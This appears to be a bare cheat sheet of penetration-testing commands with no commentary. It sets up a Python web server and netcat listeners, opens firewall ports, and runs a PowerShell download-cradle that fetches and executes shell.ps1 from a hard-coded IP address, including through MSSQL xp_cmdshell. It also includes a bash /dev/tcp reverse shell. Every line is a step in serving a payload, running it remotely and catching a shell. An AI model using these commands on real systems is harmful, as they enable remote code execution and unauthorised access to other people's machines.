python3 -m http.server 80
IEX (New-Object Net.WebClient).DownloadString("http://54.144.85.176/shell.ps1");

nc -lvnp 443
ufw allow from 172.31.56.93 proto tcp to any port 80,443
ufw allow from 54.144.85.176 proto tcp to any port 80,443


netsh advfirewall firewall add rule name = "Open port 4443 test" dir=in action=allow protocol=TCP localport=4443


xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://54.144.85.176/shell.ps1\");"
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString("http://54.144.85.176/shell.ps1");"


bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'

nc -lvnp 4444


yum install nc
sudo nc -lvnp 443
